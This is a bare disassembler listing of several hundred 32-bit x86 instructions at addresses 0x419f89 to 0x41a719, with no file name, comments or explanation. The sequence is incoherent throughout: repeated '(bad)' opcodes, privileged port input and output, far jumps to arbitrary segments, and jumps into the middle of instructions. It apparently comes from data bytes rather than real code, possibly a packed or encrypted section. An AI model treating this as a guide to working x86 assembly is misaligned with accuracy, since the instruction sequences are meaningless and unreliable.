  419f89:	rol    BYTE PTR ds:0x484dc18e,1
  419f8f:	add    al,BYTE PTR [esi-0x245efd0c]
  419f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f96:	pop    es
  419f97:	pop    esi
  419f98:	add    eax,0x33c6390d
  419f9d:	loop   0x41a017
  419f9f:	ins    BYTE PTR es:[edi],dx
  419fa0:	in     eax,0x92
  419fa2:	cmc    
  419fa3:	pop    ebp
  419fa5:	lock ss jnp 0x419fce
  419fa9:	pop    esp
  419faa:	bound  ebx,QWORD PTR [edx]
  419fac:	fadd   QWORD PTR [edi]
  419fae:	dec    ebx
  419faf:	jmp    0x419f5e
  419fb1:	and    esi,esp
  419fb3:	sbb    edx,eax
  419fb5:	ds push ss
  419fb7:	test   al,0x34
  419fb9:	ins    DWORD PTR es:[edi],dx
  419fba:	addr16 loope 0x419f94
  419fbd:	test   al,0xbc
  419fbf:	xor    BYTE PTR [ebp+0x568bfda7],0x4a
  419fc6:	test   DWORD PTR [esi-0x6c],0xa6f5571e
  419fcd:	jns    0x419f87
  419fcf:	fcomp  DWORD PTR ds:0x82443e4e
  419fd5:	fs push ss
  419fd7:	jns    0x41a054
  419fd9:	out    0x46,al
  419fdb:	and    DWORD PTR [eax-0x70],ebx
  419fde:	sar    ebx,cl
  419fe0:	dec    edi
  419fe1:	mov    bh,BYTE PTR [edi+0x26]
  419fe4:	ret    0x31a2
  419fe7:	xchg   dl,ch
  419fe9:	scas   eax,DWORD PTR es:[edi]
  419fea:	fdiv   QWORD PTR [ebp+edx*2-0x7230c5ec]
  419ff1:	dec    ecx
  419ff2:	retf   0x29a9
  419ff5:	add    al,0xc3
  419ff7:	imul   esp,ebx,0x23
  419ffa:	mov    edx,DWORD PTR [ebp+0x49b18929]
  41a000:	mov    eax,ds:0x5f11f2b9
  41a005:	stos   BYTE PTR es:[edi],al
  41a006:	push   esi
  41a007:	pop    ecx
  41a008:	mov    ch,0xdf
  41a00a:	test   BYTE PTR [ebx],ch
  41a00c:	pop    fs
  41a00e:	push   ds
  41a00f:	jbe    0x419fb7
  41a011:	fimul  WORD PTR [edi]
  41a013:	push   ebp
  41a014:	mov    ah,0x41
  41a016:	cdq    
  41a017:	mov    ch,0x8e
  41a019:	and    eax,0x809721ef
  41a01e:	add    ebx,esi
  41a020:	xchg   ah,dh
  41a022:	inc    edi
  41a023:	jne    0x419fb3
  41a025:	bound  edx,QWORD PTR [edx]
  41a027:	and    eax,0x7e6775a7
  41a02c:	stos   DWORD PTR es:[edi],eax
  41a02d:	test   eax,0x7744826a
  41a032:	xor    dl,bl
  41a034:	pop    ds
  41a035:	call   0x3118:0xa9850cbe
  41a03c:	pop    esi
  41a03d:	push   ss
  41a03e:	push   ebx
  41a03f:	test   DWORD PTR [edi-0x161f4054],edx
  41a045:	dec    ebp
  41a046:	shl    BYTE PTR [esi+0x185c60fe],0xdf
  41a04d:	xor    BYTE PTR [edx+0x54d6d8af],cl
  41a053:	or     DWORD PTR [ecx-0x45],ecx
  41a056:	rcl    BYTE PTR [ebp+0x51],0xa3
  41a05a:	clc    
  41a05b:	mov    al,0x5b
  41a05d:	in     al,0xcb
  41a05f:	std    
  41a060:	ror    BYTE PTR [edi],0xaf
  41a063:	and    BYTE PTR [ecx],ah
  41a065:	sbb    al,0x60
  41a067:	fild   WORD PTR [edi]
  41a069:	retf   
  41a06a:	push   ds
  41a06b:	jge    0x41a0cc
  41a06d:	imul   edi,DWORD PTR [edi+0x5fed7494],0xbb923251
  41a077:	inc    eax
  41a078:	or     bh,bl
  41a07a:	push   esi
  41a07b:	mov    esp,0x4372973f
  41a080:	jns    0x41a101
  41a082:	push   ebp
  41a083:	or     al,0xfd
  41a085:	push   cs
  41a086:	mov    ah,0x47
  41a088:	sub    al,0x8a
  41a08a:	jo     0x41a080
  41a08c:	shl    dh,0x30
  41a08f:	adc    DWORD PTR ds:0xed5822e3,edi
  41a095:	jnp    0x41a061
  41a097:	push   ebx
  41a098:	push   edx
  41a099:	push   eax
  41a09a:	pop    edx
  41a09b:	add    DWORD PTR [edx+eiz*1],0xffffff8d
  41a09f:	rcl    DWORD PTR [ebp-0x31],1
  41a0a2:	push   es
  41a0a3:	pop    edx
  41a0a4:	jne    0x41a0af
  41a0a6:	adc    DWORD PTR [eax-0x1b],ecx
  41a0a9:	mov    ds:0x1c41312,eax
  41a0ae:	daa    
  41a0af:	jne    0x41a102
  41a0b1:	mov    ds:0x7b03fd03,al
  41a0b6:	mov    ch,0xd3
  41a0b8:	fdiv   QWORD PTR [edi]
  41a0ba:	mov    esi,0x2b8701ab
  41a0bf:	mov    esp,esp
  41a0c1:	cmp    eax,0x6de7010d
  41a0c6:	add    bl,cl
  41a0c8:	adc    dl,0xde
  41a0cb:	int    0x53
  41a0cd:	pop    ecx
  41a0ce:	dec    esp
  41a0cf:	(bad)  
  41a0d0:	jp     0x41a0c2
  41a0d2:	(bad)  [edx-0x74098c52]
  41a0d8:	ficom  WORD PTR [ecx+0x15]
  41a0db:	adc    al,0xde
  41a0dd:	mov    eax,0xe6dc393
  41a0e2:	call   DWORD PTR [ecx+0x49]
  41a0e5:	xor    ecx,edi
  41a0e7:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41a0e9:	xchg   ecx,eax
  41a0ea:	jg     0x41a131
  41a0ec:	lea    ebx,[ebx]
  41a0ee:	(bad)  
  41a0ef:	cmp    al,0x1
  41a0f1:	jne    0x41a095
  41a0f3:	mov    edi,0x47d8542c
  41a0f8:	lea    edi,[ebx-0x74]
  41a0fb:	(bad)  
  41a0fc:	mov    ch,0x48
  41a0fe:	xor    eax,0x22edf821
  41a103:	enter  0xe609,0xbf
  41a107:	std    
  41a108:	lods   al,BYTE PTR ds:[esi]
  41a109:	dec    ecx
  41a10a:	push   0xffffffc6
  41a10c:	daa    
  41a10d:	retf   
  41a10e:	fcomp  QWORD PTR [ebp+0x61]
  41a111:	or     edi,DWORD PTR [esp+ecx*2]
  41a114:	out    dx,al
  41a115:	add    cl,dl
  41a117:	adc    DWORD PTR [ecx-0x19b47f5a],0xffffffc2
  41a11e:	ret    
  41a11f:	icebp  
  41a120:	adc    al,0xa7
  41a122:	adc    ch,BYTE PTR [eax]
  41a124:	leave  
  41a125:	xchg   ch,ch
  41a127:	jae    0x41a0ce
  41a129:	dec    eax
  41a12a:	fs jno 0x41a199
  41a12d:	stc    
  41a12e:	sbb    cl,bh
  41a130:	inc    ebp
  41a131:	or     ebx,DWORD PTR [edx+0x49]
  41a134:	out    dx,eax
  41a135:	ins    DWORD PTR es:[edi],dx
  41a136:	inc    esi
  41a137:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41a139:	dec    ecx
  41a13a:	or     esp,DWORD PTR [eax]
  41a13c:	xor    DWORD PTR [esp+eiz*2],0xa7ff682a
  41a143:	in     eax,dx
  41a144:	xchg   ecx,eax
  41a145:	pop    ecx
  41a146:	daa    
  41a147:	sbb    al,0x57
  41a149:	mov    dl,0xfe
  41a14b:	retf   
  41a14c:	add    esp,DWORD PTR [edx]
  41a14e:	retf   
  41a14f:	and    edx,DWORD PTR [esi]
  41a151:	xchg   ecx,eax
  41a152:	dec    eax
  41a153:	ds jmp 0x41a1ce
  41a156:	cmp    dl,BYTE PTR [edx-0x66]
  41a159:	stc    
  41a15a:	dec    ebp
  41a15b:	inc    esp
  41a15c:	repz jae 0x41a143
  41a15f:	push   edi
  41a160:	shl    ch,1
  41a162:	pop    ebp
  41a163:	push   ebx
  41a164:	cwde   
  41a165:	cli    
  41a166:	mov    ds,esp
  41a168:	mov    eax,0xf00c0459
  41a16d:	pop    ecx
  41a16e:	push   DWORD PTR [esi-0x4c]
  41a171:	test   DWORD PTR [ebp-0x2b],esi
  41a174:	das    
  41a175:	mov    al,0xe7
  41a177:	outs   dx,DWORD PTR ds:[esi]
  41a178:	dec    edi
  41a179:	pop    ebx
  41a17a:	ins    BYTE PTR es:[edi],dx
  41a17b:	mov    ebx,0x50003520
  41a180:	sub    al,0x7f
  41a182:	popf   
  41a183:	fistp  DWORD PTR [ecx+0x27]
  41a186:	cdq    
  41a187:	mov    dl,0x24
  41a189:	leave  
  41a18a:	mov    ds:0x371032aa,eax
  41a18f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a190:	push   edi
  41a191:	dec    edx
  41a192:	out    0xa2,eax
  41a194:	out    0x16,eax
  41a196:	mov    esp,0x1ded8c38
  41a19b:	repz das 
  41a19d:	xchg   esi,eax
  41a19e:	add    al,0x11
  41a1a0:	pop    eax
  41a1a1:	cli    
  41a1a2:	int    0xd6
  41a1a4:	jno    0x41a1b0
  41a1a6:	scas   al,BYTE PTR es:[edi]
  41a1a7:	adc    ch,BYTE PTR [eax-0x13]
  41a1aa:	dec    eax
  41a1ab:	jne    0x41a198
  41a1ad:	cld    
  41a1ae:	js     0x41a1b0
  41a1b0:	pop    ss
  41a1b1:	jno    0x41a1ca
  41a1b3:	sbb    ecx,edi
  41a1b5:	mov    edx,0x9dca9a15
  41a1ba:	data16 lods al,BYTE PTR ds:[esi]
  41a1bc:	ins    DWORD PTR es:[edi],dx
  41a1bd:	mov    ds:0x749c9f2a,al
  41a1c2:	mov    ch,0x58
  41a1c4:	or     dh,dh
  41a1c6:	inc    ebx
  41a1c7:	and    esi,DWORD PTR [ebx+0x3116ced9]
  41a1cd:	jmp    0x8893ea68
  41a1d2:	dec    eax
  41a1d3:	rcr    DWORD PTR [edi+edx*8+0x64555cea],0xbb
  41a1db:	jp     0x41a1ea
  41a1dd:	add    bl,BYTE PTR [edi-0x3e]
  41a1e0:	data16 sahf 
  41a1e2:	stc    
  41a1e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1e4:	push   ecx
  41a1e5:	fidiv  DWORD PTR ds:0x6ea4506b
  41a1eb:	(bad)  
  41a1ec:	push   eax
  41a1ed:	ds adc eax,0x82524a8e
  41a1f3:	add    al,0xb0
  41a1f5:	into   
  41a1f6:	ret    
  41a1f7:	xor    eax,0xd54ef609
  41a1fc:	sub    esp,esi
  41a1fe:	add    edx,DWORD PTR [ecx-0x71]
  41a201:	jno    0x41a1c8
  41a203:	sub    al,0x67
  41a205:	xor    DWORD PTR [ebp+edi*2-0x3b],0xffffff95
  41a20a:	fwait
  41a20b:	and    eax,0x5f85e7e3
  41a210:	jg     0x41a254
  41a212:	xchg   BYTE PTR [eax+esi*1+0x4c],dh
  41a216:	mov    dh,0x1b
  41a218:	fcmovnb st,st(0)
  41a21a:	mov    al,0x98
  41a21c:	int3   
  41a21d:	(bad)  
  41a21e:	jmp    0x9079:0x7f8f8012
  41a225:	cmp    ebx,DWORD PTR [ebx+0x1e1d3f9]
  41a22b:	in     eax,0x2b
  41a22d:	jo     0x41a1f6
  41a22f:	adc    edi,edi
  41a231:	dec    esi
  41a232:	inc    esp
  41a233:	stos   DWORD PTR es:[edi],eax
  41a234:	mov    ecx,0xe4f29a21
  41a239:	shl    BYTE PTR [ebx-0x22],0xcc
  41a23d:	(bad)  
  41a23e:	sti    
  41a23f:	push   ecx
  41a240:	jnp    0x41a255
  41a242:	adc    esi,ebx
  41a244:	pop    edx
  41a245:	cld    
  41a246:	(bad)  
  41a248:	hlt    
  41a249:	outs   dx,DWORD PTR ds:[esi]
  41a24a:	mov    al,0xa
  41a24c:	sbb    dl,dl
  41a24e:	call   0xa5ee:0x11e357e8
  41a255:	xlat   BYTE PTR ds:[ebx]
  41a256:	es mov bl,0xdf
  41a259:	pop    edx
  41a25a:	mov    al,0x37
  41a25c:	ss add esi,edx
  41a25f:	inc    ecx
  41a260:	sahf   
  41a261:	popf   
  41a262:	or     dh,BYTE PTR [edi-0x14]
  41a265:	cmp    bh,dh
  41a267:	xchg   BYTE PTR [ebx-0x62],bh
  41a26a:	shr    dh,1
  41a26c:	dec    edx
  41a26d:	push   cs
  41a26e:	mov    DWORD PTR [esi],edi
  41a270:	mov    al,ds:0x73878318
  41a275:	in     eax,0x3c
  41a277:	dec    eax
  41a278:	pop    ecx
  41a279:	inc    DWORD PTR [esi+eax*4-0x5d9716eb]
  41a280:	out    0x2d,al
  41a282:	mov    bh,0xf2
  41a284:	imul   edx,DWORD PTR [eax],0x67147489
  41a28a:	ret    
  41a28b:	or     ch,ah
  41a28d:	popa   
  41a28e:	push   ebp
  41a28f:	pop    ebp
  41a290:	xor    eax,0xe70e29ab
  41a295:	xchg   DWORD PTR [ecx+0x2e],edx
  41a298:	setl   bh
  41a29b:	cmp    al,BYTE PTR [edx-0x6f957b8f]
  41a2a1:	cmp    BYTE PTR [ecx+eiz*4-0x6734fe3a],cl
  41a2a8:	loope  0x41a276
  41a2aa:	and    eax,0xdb8e95e5
  41a2af:	cli    
  41a2b0:	jmp    0xf3de:0xc4b9c84e
  41a2b7:	(bad)  
  41a2b8:	sti    
  41a2b9:	mov    ecx,0x737fae1a
  41a2be:	pop    edx
  41a2bf:	push   esi
  41a2c0:	cmp    BYTE PTR [esi],dh
  41a2c2:	aas    
  41a2c3:	jmp    0x41a283
  41a2c5:	mov    ch,0xef
  41a2c7:	adc    eax,0x919eea27
  41a2cc:	adc    ebx,DWORD PTR [esp+ebx*2]
  41a2cf:	movzx  edx,BYTE PTR [ebx]
  41a2d2:	pop    es
  41a2d3:	jmp    0xea4a:0xbb524a6f
  41a2da:	ss push eax
  41a2dc:	push   es
  41a2dd:	test   edi,0x573a2583
  41a2e3:	cmp    bl,BYTE PTR [ecx]
  41a2e5:	adc    DWORD PTR [edi-0x6bed664c],0xffffffbe
  41a2ec:	push   cs
  41a2ed:	bound  eax,QWORD PTR ss:[ebp+0x75]
  41a2f1:	pusha  
  41a2f2:	push   esi
  41a2f3:	mov    ah,0xa6
  41a2f5:	sar    DWORD PTR [eax+0x6],0x35
  41a2f9:	ror    BYTE PTR [ebx+0x1cc8dc84],cl
  41a2ff:	jmp    0x173b246b
  41a304:	sar    BYTE PTR cs:[edx+edi*8-0xc888dc4],cl
  41a30c:	in     al,0x7
  41a30e:	lea    edx,[edi-0x78]
  41a311:	jns    0x41a38f
  41a313:	popa   
  41a314:	mov    al,0x19
  41a316:	xor    al,0xb1
  41a318:	jnp    0x41a369
  41a31a:	inc    esp
  41a31b:	dec    ebp
  41a31c:	push   eax
  41a31d:	pop    esi
  41a31e:	push   esp
  41a31f:	push   es
  41a320:	jne    0x41a2d5
  41a322:	push   0x3a30e2cb
  41a327:	sbb    ebp,DWORD PTR [edx-0x726280ca]
  41a32d:	push   ecx
  41a32e:	jp     0x41a2f6
  41a330:	push   DWORD PTR [ebx]
  41a332:	push   edi
  41a333:	ds jmp 0x8891375
  41a339:	mov    eax,0x8dcc61d7
  41a33e:	jg     0x41a2fc
  41a340:	(bad)  
  41a341:	scas   eax,DWORD PTR es:[edi]
  41a342:	enter  0x6f61,0xb8
  41a346:	mov    esi,0xd882be68
  41a34b:	xor    eax,0x5e7f06b8
  41a350:	mov    DWORD PTR [edi],0x861ab4b4
  41a356:	aam    0x9c
  41a358:	sar    DWORD PTR [edi+ebp*2-0x5d8970fb],cl
  41a35f:	std    
  41a360:	lock sbb edi,DWORD PTR [esi+0x61e0dff9]
  41a367:	mov    bh,0x3
  41a369:	mov    edi,ss
  41a36b:	xor    al,0x6c
  41a36d:	dec    esp
  41a36e:	sub    ebx,DWORD PTR ds:0xcd0f01ce
  41a374:	push   ecx
  41a375:	dec    edx
  41a376:	mov    ch,0x11
  41a378:	xor    bl,BYTE PTR ds:0xfd8ac6f2
  41a37e:	cmp    eax,0x304de59a
  41a383:	dec    edx
  41a384:	scas   al,BYTE PTR es:[edi]
  41a385:	mov    ebp,0xe8c06944
  41a38a:	adc    BYTE PTR [esi],0x9
  41a38d:	fld    TBYTE PTR [edi]
  41a38f:	dec    esi
  41a390:	lock fdiv QWORD PTR [ecx+0x688d812c]
  41a397:	xchg   ebx,eax
  41a398:	jbe    0x41a3cc
  41a39a:	cwde   
  41a39b:	push   0x19c209
  41a3a0:	inc    esi
  41a3a1:	or     DWORD PTR [ebp+0x543401c9],edi
  41a3a7:	fucomip st,st(6)
  41a3a9:	fwait
  41a3aa:	and    DWORD PTR [esi],ebx
  41a3ac:	in     al,0x9a
  41a3ae:	push   edi
  41a3af:	inc    ebx
  41a3b0:	stos   BYTE PTR es:[edi],al
  41a3b1:	or     DWORD PTR ds:0x4fbc7af2,esi
  41a3b7:	hlt    
  41a3b8:	xchg   ebx,eax
  41a3b9:	mov    edi,0x9161aa0f
  41a3be:	or     DWORD PTR [edx],edi
  41a3c0:	jecxz  0x41a43d
  41a3c2:	jp     0x41a3e8
  41a3c4:	arpl   WORD PTR [esi-0x5fe962a7],bx
  41a3ca:	mov    eax,DWORD PTR [ebp-0xc]
  41a3cd:	sbb    al,0x41
  41a3cf:	xchg   ebx,eax
  41a3d0:	add    bl,BYTE PTR ds:0x6e2d4e0f
  41a3d6:	add    BYTE PTR [esi+0x31],0x9b
  41a3da:	xor    al,0xc7
  41a3dc:	iret   
  41a3dd:	and    al,0x96
  41a3df:	ins    BYTE PTR es:[edi],dx
  41a3e0:	pop    edx
  41a3e1:	jo     0x41a390
  41a3e3:	jne    0x41a3c0
  41a3e5:	in     al,0xf8
  41a3e7:	ja     0x41a382
  41a3e9:	outs   dx,DWORD PTR ds:[esi]
  41a3ea:	mov    ebx,0x8895b332
  41a3ef:	sbb    eax,0x42d9fe9b
  41a3f4:	mov    ds:0xd047401c,al
  41a3f9:	lods   al,BYTE PTR ds:[esi]
  41a3fa:	retf   
  41a3fb:	repz sbb eax,0x1b1adda0
  41a401:	mov    BYTE PTR [esi],cl
  41a403:	iret   
  41a404:	xchg   esi,eax
  41a405:	pop    esi
  41a406:	mov    edx,0x410ee00
  41a40b:	cld    
  41a40c:	xor    eax,0xfc2974e5
  41a411:	mov    edi,0xdd382f81
  41a416:	ins    BYTE PTR es:[edi],dx
  41a417:	pushf  
  41a418:	fmul   st(2),st
  41a41a:	hlt    
  41a41b:	push   esi
  41a41c:	ret    0xfeda
  41a41f:	js     0x41a459
  41a421:	es std 
  41a423:	xor    BYTE PTR [ebx],cl
  41a425:	mov    esi,0xccccf244
  41a42a:	sti    
  41a42b:	repnz mov ch,bl
  41a42e:	jbe    0x41a493
  41a430:	mov    esp,0x65c380a6
  41a435:	(bad)  
  41a436:	dec    ecx
  41a437:	retf   
  41a438:	push   cs
  41a439:	sbb    al,0xa3
  41a43b:	mov    edx,0xb0cfa698
  41a440:	loope  0x41a3cb
  41a442:	pop    ebx
  41a443:	mov    dh,dh
  41a445:	test   al,0xfa
  41a447:	cmp    ecx,eax
  41a449:	inc    edi
  41a44a:	es mov edx,0x9d2e83a9
  41a450:	imul   ebx,DWORD PTR [edi],0xc4f2c57f
  41a456:	jbe    0x41a412
  41a458:	ret    0x9eb0
  41a45b:	div    DWORD PTR [ebx+ebp*2+0xfcf4bf8]
  41a462:	pop    esp
  41a463:	push   edi
  41a464:	xlat   BYTE PTR ds:[ebx]
  41a465:	push   ds
  41a466:	retf   0xb237
  41a469:	push   ecx
  41a46a:	mov    ds:0xc211f42,eax
  41a46f:	or     DWORD PTR [esi],eax
  41a471:	add    BYTE PTR [edx-0x6d],bh
  41a474:	stc    
  41a475:	fist   DWORD PTR [ebx-0x68035e35]
  41a47b:	arpl   WORD PTR [esi-0x6a1faf06],di
  41a481:	js     0x41a459
  41a483:	dec    DWORD PTR [edi]
  41a485:	jnp    0x41a49d
  41a487:	and    al,0x98
  41a489:	adc    DWORD PTR [eax-0x2fb77e6],0x96dc137
  41a493:	pop    ebx
  41a494:	out    dx,eax
  41a495:	dec    ebp
  41a496:	dec    eax
  41a497:	jnp    0x41a43e
  41a499:	sti    
  41a49a:	inc    esi
  41a49b:	xor    eax,0x503a2ac0
  41a4a0:	(bad)  [esi*8-0x4f2607e8]
  41a4a7:	ret    0xc78c
  41a4aa:	add    bl,BYTE PTR [edx-0x7e7c31ba]
  41a4b0:	fadd   QWORD PTR [ecx]
  41a4b2:	sti    
  41a4b3:	sub    ecx,DWORD PTR [ecx-0x6b]
  41a4b6:	cdq    
  41a4b7:	call   0xa2b29137
  41a4bc:	jl     0x41a4bf
  41a4be:	imul   ebp,DWORD PTR [eiz*2+0x200213da],0xffffffc0
  41a4c6:	stos   DWORD PTR es:[edi],eax
  41a4c7:	mov    eax,ds:0x5e3df9e3
  41a4cc:	sbb    dh,BYTE PTR [ebx]
  41a4ce:	jns    0x41a48d
  41a4d0:	inc    edi
  41a4d1:	dec    edi
  41a4d2:	push   ecx
  41a4d3:	push   esi
  41a4d4:	test   BYTE PTR [edi],cl
  41a4d6:	inc    esi
  41a4d7:	stos   DWORD PTR es:[edi],eax
  41a4d8:	mov    cl,0x35
  41a4da:	dec    eax
  41a4db:	stc    
  41a4dc:	sub    ch,BYTE PTR [edx-0x74]
  41a4df:	or     ebp,0xffffff95
  41a4e2:	es add ebp,ebx
  41a4e5:	stc    
  41a4e6:	sbb    dh,BYTE PTR [edi+0x78]
  41a4e9:	sbb    BYTE PTR [eax+edx*4],0x76
  41a4ed:	push   esi
  41a4ee:	in     eax,0x7e
  41a4f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4f1:	lock rcl DWORD PTR [edi],0x93
  41a4f5:	mov    ebx,0xddcebb26
  41a4fa:	loop   0x41a4f4
  41a4fc:	mov    BYTE PTR [edx+eiz*1],bl
  41a4ff:	icebp  
  41a500:	stos   DWORD PTR es:[edi],eax
  41a501:	inc    edx
  41a502:	fld    QWORD PTR [eax+0x265fca3c]
  41a508:	enter  0x5111,0x1e
  41a50c:	hlt    
  41a50d:	repnz xchg edx,eax
  41a50f:	mov    ebx,0x1eec6f50
  41a514:	inc    eax
  41a515:	cmp    eax,0x352af26b
  41a51a:	ss pusha 
  41a51c:	sub    bh,ah
  41a51e:	ret    
  41a51f:	cmp    esp,DWORD PTR [ebp-0x775cbc05]
  41a525:	adc    al,0x99
  41a527:	dec    ecx
  41a528:	in     al,0xca
  41a52a:	ins    DWORD PTR es:[edi],dx
  41a52b:	xchg   esp,eax
  41a52c:	out    dx,eax
  41a52d:	mov    al,ds:0x4a1b8d1b
  41a532:	or     al,BYTE PTR [edx+0x4b931ed0]
  41a538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a539:	dec    DWORD PTR [eax+edi*1]
  41a53c:	lahf   
  41a53d:	push   ecx
  41a53e:	cmp    al,0x71
  41a540:	mov    bl,0xaa
  41a542:	sub    al,0x92
  41a544:	cdq    
  41a545:	(bad)  
  41a546:	ins    BYTE PTR es:[edi],dx
  41a547:	jns    0x41a540
  41a549:	lahf   
  41a54a:	xor    DWORD PTR [edx+0x4e817b8d],edi
  41a550:	mov    ebp,DWORD PTR [esp+edi*8+0x56]
  41a554:	or     DWORD PTR [eax+0x6c],ebp
  41a557:	cmc    
  41a558:	xchg   DWORD PTR [ebx-0x75],edi
  41a55b:	loopne 0x41a4eb
  41a55d:	xchg   edi,eax
  41a55e:	mov    esp,0x456a9318
  41a563:	sbb    eax,ecx
  41a565:	in     al,dx
  41a566:	add    DWORD PTR [esi],0xffffffd9
  41a569:	gs dec ecx
  41a56b:	add    eax,0xd1d26084
  41a570:	scas   eax,DWORD PTR es:[edi]
  41a571:	lds    ebx,FWORD PTR [eax]
  41a573:	sar    DWORD PTR [edx],0x50
  41a576:	and    ebp,DWORD PTR [ecx-0x4accf3b3]
  41a57c:	arpl   WORD PTR [ecx-0x20be6bf8],dx
  41a582:	mov    edx,0xd3cc6f4
  41a587:	aaa    
  41a588:	adc    ch,ch
  41a58a:	mov    ah,0x8d
  41a58c:	jmp    0x41a593
  41a58e:	test   BYTE PTR [eax-0x79],0x6b
  41a592:	sub    dl,BYTE PTR [eax+0x699ba595]
  41a598:	push   0x8e820216
  41a59d:	test   eax,0xa74b91c6
  41a5a2:	jmp    0x41a576
  41a5a4:	out    dx,eax
  41a5a5:	sbb    eax,0x494252a6
  41a5aa:	(bad)  
  41a5ab:	xchg   esp,eax
  41a5ac:	adc    eax,0xee7ca6a0
  41a5b1:	mov    ebx,0x1fab0e27
  41a5b6:	ins    BYTE PTR es:[edi],dx
  41a5b7:	add    eax,0xcf7a9a8a
  41a5bc:	repnz mov bh,0xb8
  41a5bf:	int3   
  41a5c0:	mov    ecx,eax
  41a5c2:	arpl   di,sp
  41a5c4:	ins    DWORD PTR es:[edi],dx
  41a5c5:	and    eax,0x8594e1c6
  41a5ca:	dec    esp
  41a5cb:	inc    esi
  41a5cc:	mov    ah,0x5d
  41a5ce:	sub    eax,0x9551b90f
  41a5d3:	outs   dx,BYTE PTR ds:[esi]
  41a5d4:	sub    ebp,DWORD PTR [ecx-0x33]
  41a5d7:	mov    ds:0x956b3a6a,eax
  41a5dc:	loope  0x41a5f3
  41a5de:	sbb    BYTE PTR [ebp+0x28],0x1c
  41a5e2:	mov    bh,BYTE PTR [eax-0x5b]
  41a5e5:	in     al,dx
  41a5e6:	outs   dx,DWORD PTR ds:[esi]
  41a5e7:	push   ebp
  41a5e8:	in     eax,dx
  41a5e9:	dec    cx
  41a5eb:	xchg   esi,eax
  41a5ec:	mov    ebx,0xe8bc5f2b
  41a5f1:	out    0xe4,eax
  41a5f3:	jl     0x41a57e
  41a5f5:	mov    edx,0x423957e5
  41a5fa:	aaa    
  41a5fb:	sar    BYTE PTR [eax+ebx*8],1
  41a5fe:	out    dx,eax
  41a5ff:	cmp    DWORD PTR [edi],esi
  41a601:	and    ebx,DWORD PTR [eax-0x43a6ae6c]
  41a607:	jae    0x41a59a
  41a609:	push   es
  41a60a:	inc    ecx
  41a60b:	aaa    
  41a60c:	jnp    0x41a596
  41a60e:	shr    BYTE PTR ds:0x1ec68311,0x23
  41a615:	jge    0x41a597
  41a617:	sbb    eax,0x89603078
  41a61c:	cmp    ch,BYTE PTR [eax]
  41a61e:	mov    bl,0x33
  41a620:	pop    esi
  41a621:	push   ss
  41a622:	inc    esi
  41a623:	jns    0x41a5f9
  41a625:	sbb    edi,edi
  41a627:	adc    al,0xdd
  41a629:	inc    edi
  41a62a:	jge    0x41a641
  41a62c:	mov    esp,0x7894b877
  41a631:	mov    ebx,ebp
  41a633:	jo     0x41a657
  41a635:	(bad)  
  41a636:	jo     0x41a604
  41a638:	sbb    BYTE PTR [edi-0x3],ah
  41a63b:	sbb    al,0x33
  41a63d:	inc    ebp
  41a63e:	call   0xa0fa:0x556895bc
  41a645:	inc    esp
  41a646:	mov    al,ds:0xb4b830ed
  41a64b:	mov    esp,0xe008bc00
  41a650:	and    eax,0x3151d620
  41a655:	dec    eax
  41a656:	and    DWORD PTR [ebx],ebp
  41a658:	xchg   ch,ch
  41a65a:	jp     0x41a649
  41a65c:	sar    ebx,0x41
  41a65f:	dec    esi
  41a660:	hlt    
  41a661:	jo     0x41a68a
  41a663:	xor    eax,0x3365967
  41a668:	out    dx,eax
  41a669:	mov    bh,0xda
  41a66b:	test   eax,0xa0426a6e
  41a670:	imul   ebx,DWORD PTR [ecx-0x2e],0x7b
  41a674:	in     al,dx
  41a675:	out    dx,eax
  41a676:	fbstp  TBYTE PTR [eax]
  41a678:	jecxz  0x41a608
  41a67a:	ret    
  41a67b:	fs cmp al,0x3b
  41a67e:	mov    ah,0xd4
  41a680:	inc    eax
  41a681:	call   DWORD PTR [esi+0x6d]
  41a684:	cmp    al,0x32
  41a686:	xchg   ebp,eax
  41a687:	fldcw  WORD PTR [ecx+0x69606989]
  41a68d:	xchg   ebx,eax
  41a68e:	repz fistp QWORD PTR [ebp+0x36d8e3d8]
  41a695:	mov    esp,ds
  41a697:	or     DWORD PTR [eax-0x73],esp
  41a69a:	push   edi
  41a69b:	iret   
  41a69c:	cdq    
  41a69d:	mov    edx,0x7ce69995
  41a6a2:	daa    
  41a6a3:	sbb    dh,al
  41a6a5:	mov    eax,ds:0xdfe6d81
  41a6aa:	xor    bh,ah
  41a6ac:	cli    
  41a6ad:	aas    
  41a6ae:	or     al,0x89
  41a6b0:	add    dl,BYTE PTR [ecx+0x5a]
  41a6b3:	into   
  41a6b4:	xchg   edx,eax
  41a6b5:	mov    ecx,0x71292aa8
  41a6ba:	sbb    BYTE PTR [edx],dh
  41a6bc:	ss enter 0xeedc,0xa1
  41a6c1:	mov    BYTE PTR [ebx],al
  41a6c3:	jo     0x41a70a
  41a6c5:	pmaxsw mm1,QWORD PTR [ebx]
  41a6c8:	jo     0x41a662
  41a6ca:	dec    edx
  41a6cb:	fnsave [esi+0x774efaa0]
  41a6d1:	add    bl,BYTE PTR [edx-0x19ddcb57]
  41a6d7:	inc    eax
  41a6d8:	add    bl,BYTE PTR [edi]
  41a6da:	test   al,0x74
  41a6dc:	cmp    eax,0x38a9ecb6
  41a6e1:	adc    DWORD PTR [eax+0x23],esp
  41a6e4:	dec    ecx
  41a6e5:	arpl   WORD PTR [edi],si
  41a6e7:	pushf  
  41a6e8:	push   ebx
  41a6e9:	cs inc esi
  41a6eb:	in     al,dx
  41a6ec:	pop    ebx
  41a6ed:	inc    ecx
  41a6ee:	aad    0x1c
  41a6f0:	jp     0x41a749
  41a6f2:	jo     0x41a6f0
  41a6f4:	mov    ch,0x91
  41a6f6:	mov    BYTE PTR [di+0x28b9],bl
  41a6fb:	push   eax
  41a6fc:	dec    dx
  41a6fe:	in     al,dx
  41a6ff:	nop
  41a700:	enter  0x10c9,0x7e
  41a704:	hlt    
  41a705:	fcomp  DWORD PTR [esi-0x3b]
  41a708:	lods   eax,DWORD PTR ds:[esi]
  41a709:	test   cl,0x3
  41a70c:	adc    DWORD PTR [edi],ebp
  41a70e:	mov    ah,0x0
  41a710:	icebp  
  41a711:	es gs pop edx
  41a714:	call   0x6470cebe
  41a719:	test   al,0x42
